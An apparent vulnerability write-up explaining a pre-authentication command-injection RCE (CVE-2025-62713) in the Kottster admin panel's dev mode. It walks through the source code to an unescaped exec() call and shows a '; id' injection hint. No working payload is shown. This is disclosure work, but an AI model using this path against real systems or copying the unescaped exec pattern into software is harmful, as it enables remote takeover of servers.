<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"><link rel="stylesheet" href="/assets/css/just-the-docs-head-nav.css" id="jtd-head-nav-stylesheet"><style id="jtd-nav-activation"> .site-nav > ul.nav-list:first-child > li > a, .site-nav > ul.nav-list:first-child > li > ul > li:not(:nth-child(1)) > a, .site-nav > ul.nav-list:first-child > li > ul > li > ul > li a { background-image: none; } .site-nav > ul.nav-list:not(:first-child) a, .site-nav li.external a { background-image: none; } .site-nav > ul.nav-list:first-child > li:nth-child(4) > ul > li:nth-child(1) > a { font-weight: 600; text-decoration: none; }.site-nav > ul.nav-list:first-child > li:nth-child(4) > button svg, .site-nav > ul.nav-list:first-child > li:nth-child(4) > ul > li:nth-child(1) > button svg { transform: rotate(-90deg); }.site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(4) > ul.nav-list, .site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(4) > ul.nav-list > li.nav-list-item:nth-child(1) > ul.nav-list { display: block; }</style><script src="/assets/js/vendor/lunr.min.js"></script> <script src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico" type="image/x-icon"><title>(0-Click) CVE-2025-62713 | EntryPoint Research</title><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="(0-Click) CVE-2025-62713" /><meta property="og:locale" content="en_US" /><meta name="description" content="Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces." /><meta property="og:description" content="Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces." /><link rel="canonical" href="http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-62713/" /><meta property="og:url" content="http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-62713/" /><meta property="og:site_name" content="EntryPoint Research" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(0-Click) CVE-2025-62713" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"Focused on identifying vulnerabilities in initial access paths and pre-auth attack surfaces.","headline":"(0-Click) CVE-2025-62713","url":"http://localhost:4000/docs/Pre-Auth-RCE/CVE-2025-62713/"}</script><body> <a class="skip-to-main" href="#main-content">Skip to main content</a> <svg xmlns="http://www.w3.org/2000/svg" class="d-none"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-external-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-external-link"><title id="svg-external-link-title">(external link)</title><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-copy" viewBox="0 0 16 16"><title>Copy</title><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/> </svg> </symbol> <symbol id="svg-copied" viewBox="0 0 16 16"><title>Copied</title><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard-check-fill" viewBox="0 0 16 16"><path d="M6.5 0A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3Zm3 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3Z"/><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1A2.5 2.5 0 0 1 9.5 5h-3A2.5 2.5 0 0 1 4 2.5v-1Zm6.854 7.354-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 0 1 .708-.708L7.5 10.793l2.646-2.647a.5.5 0 0 1 .708.708Z"/> </svg> </symbol> </svg><div class="side-bar"><div class="site-header" role="banner"> <a href="/" class="site-title lh-tight"> EntryPoint Research </a> <button id="menu-button" class="site-button btn-reset" aria-label="Toggle menu" aria-pressed="false"> <svg viewBox="0 0 24 24" class="icon" aria-hidden="true"><use xlink:href="#svg-menu"></use></svg> </button></div><nav aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item"><a href="/docs/Auth%20Bypass/" class="nav-list-link">Auth Bypass</a><li class="nav-list-item"><a href="/docs/SSRF%20(Server-Side%20Request%20Forgery)/" class="nav-list-link">SSRF</a><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in Pre-Auth RCE category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/docs/Pre-Auth-RCE/" class="nav-list-link">Pre-Auth RCE</a><ul class="nav-list"><li class="nav-list-item"><a href="/docs/Pre-Auth-RCE/CVE-2025-62713/" class="nav-list-link">(0-Click) CVE-2025-62713</a><li class="nav-list-item"><a href="/docs/Pre-Auth-RCE/CVE-2025-66509/" class="nav-list-link">(1-Click) CVE-2025-66509</a></ul></ul></nav><footer class="site-footer"> Let's build something awesome together.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search" role="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search EntryPoint Research" aria-label="Search EntryPoint Research" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div></div><div class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"><a href="/docs/Pre-Auth-RCE/">Pre-Auth RCE</a><li class="breadcrumb-nav-list-item"><span>(0-Click) CVE-2025-62713</span></ol></nav><div id="main-content" class="main-content"><main><h1 id="summary"> <a href="#summary" class="anchor-heading" aria-labelledby="summary"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Summary</h1><p>Kottster — an admin panel product that helps generate and build management pages for viewing, managing, and visualizing data — contains a pre-authentication remote code execution (Pre-Auth RCE) vulnerability when running in Development (Dev) mode. The issue arises from unescaped command arguments and insufficient revalidation of initial configuration settings.</p><h1 id="how-the-actions-works"> <a href="#how-the-actions-works" class="anchor-heading" aria-labelledby="how-the-actions-works"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> How the actions works</h1><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kr">public</span> <span class="nf">getInternalApiRoute</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">:</span> <span class="nx">Request</span><span class="p">,</span> <span class="nx">res</span><span class="p">:</span> <span class="nx">Response</span><span class="p">,</span> <span class="nx">next</span><span class="p">:</span> <span class="nx">NextFunction</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">next</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nf">handleInternalApiRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>

        <span class="k">if </span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">res</span><span class="p">.</span><span class="nf">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">);</span>
          <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Not Found</span><span class="dl">'</span> <span class="p">});</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">error</span> <span class="k">instanceof</span> <span class="nx">HttpException</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">statusCode</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span>
            <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">statusCode</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">statusCode</span><span class="p">,</span>
            <span class="na">message</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span>
          <span class="p">});</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Internal API error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span> <span class="na">error</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Internal Server Error</span><span class="dl">'</span> <span class="p">});</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div><p>To analyze the logic that handles internal APIs, you should look at the getInternalApiRoute() function. In the getInternalApiRoute() function, the req object is passed to the handleInternalApiRequest() function.</p><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kr">private</span> <span class="k">async</span> <span class="nf">handleInternalApiRequest</span><span class="p">(</span><span class="nx">request</span><span class="p">:</span> <span class="nx">Request</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="p">{</span>
    <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span> <span class="o">|</span> <span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">result</span><span class="p">?:</span> <span class="nx">any</span><span class="p">;</span>
    <span class="nx">error</span><span class="p">?:</span> <span class="nx">string</span><span class="p">;</span>
  <span class="p">}</span><span class="o">&gt;</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="p">{</span> <span class="nx">isTokenValid</span><span class="p">,</span> <span class="nx">invalidTokenErrorMessage</span><span class="p">,</span> <span class="nx">user</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nf">ensureValidToken</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>

      <span class="kd">const</span> <span class="nx">action</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">action</span> <span class="nx">as</span> <span class="nx">keyof</span> <span class="nx">InternalApiSchema</span> <span class="o">|</span> <span class="kc">undefined</span><span class="p">;</span>
      <span class="kd">const</span> <span class="nx">actionData</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Action not found in request</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">isTokenValid</span> <span class="o">&amp;&amp;</span> <span class="nx">action</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">([</span><span class="dl">'</span><span class="s1">getApp</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">initApp</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">login</span><span class="dl">'</span><span class="p">]</span> <span class="nf">as </span><span class="p">(</span><span class="nx">keyof</span> <span class="nx">InternalApiSchema</span><span class="p">)[]).</span><span class="nf">includes</span><span class="p">(</span><span class="nx">action</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">UnauthorizedException</span><span class="p">(</span><span class="s2">`Invalid JWT token: </span><span class="p">${</span><span class="nx">invalidTokenErrorMessage</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">return</span> <span class="p">{</span>
        <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">result</span><span class="p">:</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nf">executeAction</span><span class="p">(</span><span class="nx">action</span><span class="p">,</span> <span class="nx">actionData</span><span class="p">,</span> <span class="nx">user</span> <span class="o">??</span> <span class="kc">undefined</span><span class="p">,</span> <span class="nx">request</span><span class="p">),</span>
      <span class="p">};</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// If the error is an instance of HttpException, we can rethrow it</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">error</span> <span class="k">instanceof</span> <span class="nx">HttpException</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Kottster API error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>

      <span class="k">return</span> <span class="p">{</span>
        <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">error</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
      <span class="p">};</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div><p>Inside the handleInternalApiRequest() function, a JWT token is designed (issued) and its validity is verified. If the token is invalid — meaning the user is not logged in — only the actions ‘getApp’, ‘initApp’, and ‘login’ can be invoked. The initApp action functions as an initial setup process, similar to common CMS platforms, where it performs basic configuration during the first run. In most CMS systems, this feature is removed after the initial setup is completed.</p><p>After that, the executeAction() function is called to process and execute the internal API request.</p><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kr">public</span> <span class="k">async</span> <span class="nf">executeAction</span><span class="p">(</span><span class="nx">action</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">data</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="nx">user</span><span class="p">?:</span> <span class="nx">IdentityProviderUser</span><span class="p">,</span> <span class="nx">req</span><span class="p">?:</span> <span class="nx">Request</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">await</span> <span class="nx">ActionService</span><span class="p">.</span><span class="nf">getAction</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">action</span><span class="p">).</span><span class="nf">executeWithCheckings</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">req</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div><p>The executeAction() function internally calls the getAction() function. By examining the code of the getAction() function below, it can be seen that various actions are defined within it.</p><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">class</span> <span class="nc">ActionService</span> <span class="p">{</span>
  <span class="kd">static</span> <span class="nf">getAction</span><span class="p">(</span><span class="nx">app</span><span class="p">:</span> <span class="nx">KottsterApp</span><span class="p">,</span> <span class="nx">action</span><span class="p">:</span> <span class="nx">string</span><span class="p">):</span> <span class="nx">Action</span> <span class="o">|</span> <span class="nx">DevAction</span> <span class="p">{</span>
    <span class="k">switch </span><span class="p">(</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getApp</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetApp</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">login</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Login</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getDataSources</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetDataSources</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getDataSourceSchema</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetDataSourceSchema</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">initApp</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">InitApp</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">updateAppSchema</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">UpdateAppSchema</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">createPage</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">CreatePage</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">generateSql</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GenerateSql</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">updatePage</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">UpdatePage</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">deletePage</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">DeletePage</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">addDataSource</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">AddDataSource</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">removeDataSource</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">RemoveDataSource</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">installPackagesForDataSource</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">InstallPackagesForDataSource</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getProjectSettings</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetProjectSettings</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getUsers</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetUsers</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">createUser</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">CreateUser</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">updateUser</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">UpdateUser</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">deleteUser</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">DeleteUser</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">createRole</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">CreateRole</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">updateRole</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">UpdateRole</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">deleteRole</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">DeleteRole</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">changePassword</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">ChangePassword</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">logOutAllSessions</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">LogOutAllSessions</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="k">case</span> <span class="dl">'</span><span class="s1">getKottsterContext</span><span class="dl">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">GetKottsterContext</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
      <span class="nl">default</span><span class="p">:</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="s2">`Action </span><span class="p">${</span><span class="nx">action</span><span class="p">}</span><span class="s2"> not found`</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><h1 id="how-to-trigger-rce"> <a href="#how-to-trigger-rce" class="anchor-heading" aria-labelledby="how-to-trigger-rce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> How to trigger RCE</h1><div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">class</span> <span class="nc">InstallPackagesForDataSource</span> <span class="kd">extends</span> <span class="nc">DevAction</span> <span class="p">{</span>
  <span class="kr">public</span> <span class="k">async</span> <span class="nf">execute</span><span class="p">(</span><span class="nx">data</span><span class="p">:</span> <span class="nx">InternalApiBody</span><span class="o">&lt;</span><span class="dl">'</span><span class="s1">installPackagesForDataSource</span><span class="dl">'</span><span class="o">&gt;</span><span class="p">):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">InternalApiResult</span><span class="o">&lt;</span><span class="dl">'</span><span class="s1">installPackagesForDataSource</span><span class="dl">'</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="p">{</span> <span class="nx">type</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>

      <span class="kd">const</span> <span class="nx">command</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getCommand</span><span class="p">(</span><span class="nx">type</span><span class="p">);</span>
      <span class="nf">exec</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="p">{</span> <span class="na">cwd</span><span class="p">:</span> <span class="nx">PROJECT_DIR</span> <span class="p">},</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`Error executing command: </span><span class="p">${</span><span class="nx">error</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
          <span class="nf">reject</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nf">resolve</span><span class="p">();</span>
      <span class="p">});</span>
    <span class="p">});</span>
  <span class="p">}</span>

  <span class="kr">private</span> <span class="nf">getCommand</span><span class="p">(</span><span class="nx">type</span><span class="p">:</span> <span class="nx">DataSourceType</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span> <span class="s2">`npm run dev:add-data-source </span><span class="p">${</span><span class="nx">type</span><span class="p">}</span><span class="s2"> -- --skipFileGeneration; id`</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">`npm run dev:add-data-source </span><span class="p">${</span><span class="nx">type</span><span class="p">}</span><span class="s2"> -- --skipFileGeneration`</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
